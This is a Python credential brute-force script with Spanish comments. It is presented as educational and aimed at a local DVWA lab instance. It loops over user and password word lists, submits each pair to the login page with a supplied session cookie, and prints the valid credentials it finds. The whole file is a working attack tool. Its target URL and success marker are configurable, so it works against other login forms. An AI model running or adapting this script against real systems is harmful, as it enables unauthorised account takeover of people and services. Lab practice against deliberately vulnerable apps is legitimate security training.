import argparse
import time
from pathlib import Path

import requests


def cargar_diccionario(ruta: str) -> list[str]:
    archivo = Path(ruta)

    if not archivo.exists():
        raise FileNotFoundError(f"No existe el archivo: {ruta}")

    with archivo.open("r", encoding="utf-8") as f:
        lineas = [line.strip() for line in f.readlines()]

    return [linea for linea in lineas if linea]


def probar_login(
    session: requests.Session,
    url: str,
    username: str,
    password: str,
    success_text: str,
    timeout: float,
) -> tuple[bool, int, str]:
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
    }

    respuesta = session.get(url, params=params, timeout=timeout)

    texto = respuesta.text

    es_valido = success_text in texto and "Username and/or password incorrect." not in texto

    return es_valido, respuesta.status_code, respuesta.url


def main():
    parser = argparse.ArgumentParser(
        description="Bruteforce educativo contra DVWA local en vulnerabilities/brute"
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:4280", help="URL base de DVWA")
    parser.add_argument("--users", required=True, help="Archivo de usuarios")
    parser.add_argument("--passwords", required=True, help="Archivo de contraseñas")
    parser.add_argument("--phpsessid", required=True, help="Valor de la cookie PHPSESSID")
    parser.add_argument("--security", default="low", help="Nivel de seguridad de DVWA")
    parser.add_argument(
        "--success-text",
        default="Welcome to the password protected area",
        help="Texto que indica login exitoso",
    )
    parser.add_argument("--timeout", type=float, default=5.0, help="Timeout por request")
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Pausa entre intentos, en segundos",
    )

    args = parser.parse_args()

    brute_url = f"{args.base_url.rstrip('/')}/vulnerabilities/brute/"

    usuarios = cargar_diccionario(args.users)
    passwords = cargar_diccionario(args.passwords)

    session = requests.Session()

    session.headers.update(
        {
            "User-Agent": "python-requests-dvwa-lab/1.0",
            "Referer": brute_url,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
    )

    session.cookies.set("PHPSESSID", args.phpsessid)
    session.cookies.set("security", args.security)

    total_intentos = 0
    encontrados = []

    inicio = time.perf_counter()

    print(f"[+] Objetivo: {brute_url}")
    print(f"[+] Usuarios cargados: {len(usuarios)}")
    print(f"[+] Passwords cargadas: {len(passwords)}")
    print("[+] Iniciando pruebas...\n")

    for usuario in usuarios:
        for password in passwords:
            total_intentos += 1

            try:
                valido, status_code, final_url = probar_login(
                    session=session,
                    url=brute_url,
                    username=usuario,
                    password=password,
                    success_text=args.success_text,
                    timeout=args.timeout,
                )

                print(
                    f"[{total_intentos:03d}] "
                    f"user='{usuario}' pass='{password}' "
                    f"status={status_code} valido={valido}"
                )

                if valido:
                    encontrados.append((usuario, password))
                    print(f"    -> ENCONTRADO: {usuario}:{password}")
                    print(f"    -> URL final: {final_url}\n")

            except requests.RequestException as e:
                print(f"[!] Error con {usuario}:{password} -> {e}")

            if args.delay > 0:
                time.sleep(args.delay)

    fin = time.perf_counter()
    duracion = fin - inicio
    rps = total_intentos / duracion if duracion > 0 else 0.0

    print("\n===== RESUMEN =====")
    print(f"Intentos totales: {total_intentos}")
    print(f"Tiempo total: {duracion:.4f} s")
    print(f"Intentos/segundo: {rps:.2f}")

    if encontrados:
        print("Credenciales válidas encontradas:")
        for user, pwd in encontrados:
            print(f"  - {user}:{pwd}")
    else:
        print("No se encontraron credenciales válidas.")


if __name__ == "__main__":
    main()